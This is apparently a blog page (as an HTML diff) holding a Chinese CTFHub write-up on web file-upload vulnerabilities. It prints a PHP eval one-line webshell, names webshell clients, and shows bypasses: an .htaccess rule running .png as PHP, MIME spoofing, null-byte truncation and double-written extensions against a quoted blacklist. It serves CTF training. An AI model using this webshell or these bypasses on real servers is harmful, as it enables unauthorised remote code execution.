@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="BC">
+
+
+
+
+
+<title>CTFHUB技能树Web-文件上传 | BC&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">BC&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/link">Link</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">BC&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/link">Link</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CTFHUB技能树Web-文件上传</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">BC</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 2, 2020&nbsp;&nbsp;20:20:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器并执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的利用技术门槛非常的低，对于攻击者来说很容易实施。</p>
+<p>工具选择 ：</p>
+<ol>
+<li>中国菜刀  </li>
+<li>蚁剑 <a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/">https://github.com/AntSwordProject/</a>  </li>
+<li>冰蝎 <a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></li>
+</ol>
+<h4 id="1-无验证"><a href="#1-无验证" class="headerlink" title="1.无验证"></a>1.无验证</h4><p>因为在这里并没有对上传文件做任何检验<br>写个一句话shell传上去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;hack&#39;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将文件用浏览器上传给服务器，然后用蚁剑连上去，就可以找到flag文件，打开就可以拿到flag。</p>
+<h4 id="2-前端验证"><a href="#2-前端验证" class="headerlink" title="2.前端验证"></a>2.前端验证</h4><p>在文件上传之前，前端js代码会对文件后缀进行一次验证，尝试直接上传后门，发现被拦截，经过判断为Javascript前端验证：<br>提供两种方法：</p>
+<ol>
+<li><p>用Firefox浏览器插件禁用页面js代码  ，F12删掉js代码然后再次提交hack.php即可</p>
+</li>
+<li><p>burp suite绕过前端验证，先将文件名改为hack.jpg，上传时通过burp suite将文件名修改为hack.php，即可绕过验证。</p>
+</li>
+</ol>
+<p>然后用蚁剑连上去，就可以找到flag文件</p>
+<h4 id="3-htaccess"><a href="#3-htaccess" class="headerlink" title="3. .htaccess"></a>3. .htaccess</h4><blockquote>
+<p>百科对.htaccess的介绍：.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+</blockquote>
+<p>这道题应该是让用自己写的.htaccess去覆盖服务器的.htaccess从而允许一些功能。</p>
+<p>先上传个一句话，提示文件类型不匹配<br>又上传了一张图片，上传成功<br>推断需要构造.htaccess，来让服务器把png当作php解析，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .png</span><br></pre></td></tr></table></figure>
+
+<p>上传.htaccess（就上边这一句话）–&gt;上传成功</p>
+<p>写个一句话shell，然后把后缀改成png –&gt; 上传成功</p>
+<p>最后用蚁剑连上去，就能在html文件夹里找到flag</p>
+<h4 id="4-MIME绕过"><a href="#4-MIME绕过" class="headerlink" title="4.MIME绕过"></a>4.MIME绕过</h4><blockquote>
+<p>MIME原本是指多用途互联网邮件扩展类型。后来被用到了HTTP的Content-Type字段，称为互联网媒体类型。</p>
+</blockquote>
+<p>上传php文件，提示：文件类型不正确，查看源代码，发现没有前端验证，猜测为MIME验证。</p>
+<p>所以这道题的思路很清晰，修改Content-Type为合法类型用burp抓包，修改content-type.上传成功，手工/工具连接，在html拿到flag</p>
+<p><img src="/images/CTFHUB/MIME%E7%BB%95%E8%BF%87.png"></p>
+<h4 id="5-00截断"><a href="#5-00截断" class="headerlink" title="5.00截断"></a>5.00截断</h4><p>访问题目，是一个上传页面，我上传了一句话木马，拦截数据包。php 5.2版本的00截断，应该在上传路径截断<br>可以看到请求连接处包含road参数，修改参数为/var/www/html/upload/shell.php%00<br>上传后门，蚁剑，拿flag<br><img src="/images/CTFHUB/00%E6%88%AA%E6%96%AD.png"></p>
+<h4 id="6-双写绕过"><a href="#6-双写绕过" class="headerlink" title="6.双写绕过"></a>6.双写绕过</h4><p>看源码发现黑名单</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$name = basename($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">$blacklist = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line">$name = str_ireplace($blacklist, <span class="string">&quot;&quot;</span>, $name);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>代码仅将黑名单替换为空白，只需要构造：.pphphp，就可以绕过。<br>上传后门，蚁剑，拿flag</p>
+<h4 id="7-文件头检查"><a href="#7-文件头检查" class="headerlink" title="7.文件头检查"></a>7.文件头检查</h4><p>文件类型不正确, 只允许上传 jpeg jpg png gif 类型的文件</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>BC</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://youngbc.cn/2020/04/02/CTFHUB%E6%8A%80%E8%83%BD%E6%A0%91Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">https://youngbc.cn/2020/04/02/CTFHUB%E6%8A%80%E8%83%BD%E6%A0%91Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTFHUB/"># CTFHUB</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/04/03/ECDH%E7%A7%98%E9%92%A5%E5%8D%8F%E5%95%86%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/">ECDH秘钥协商算法原理</a>
+            
+            
+            <a class="next" rel="next" href="/2020/03/01/CTF_crypto%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%89%B9%E5%BE%81/">CTF_crypto常见加密特征</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© BC </span>
+    </div>
+	<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
+	<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">陕ICP备20005804号</a> 
+    <div>
+	<img src="/image/youpaiyun.png" width="5%" /></a>
+	<a href="http://www.beian.miit.gov.cn/" target="_blank" ></a>
+    </div>
+
+
+
+    </div>
+</body>
+</html>
